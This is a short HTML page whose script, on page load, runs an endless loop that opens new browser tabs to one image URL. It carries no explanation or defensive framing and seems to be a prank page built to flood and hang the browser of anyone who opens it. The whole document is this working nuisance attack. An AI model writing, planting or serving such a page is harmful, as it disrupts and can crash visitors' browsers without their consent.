<!DOCTYPE html>
<html>
<head>
<script>
function OpenInNewTab(url) {
  var win = window.open(url, '_blank');
  win.focus();
}
function loopTabs() {
    while(true) {
        OpenInNewTab('https://i1.sndcdn.com/artworks-000664006093-hhm0rf-t500x500.jpg');
    }
}
</script>
</head>
<body onload="loopTabs()">
</body>
</html>
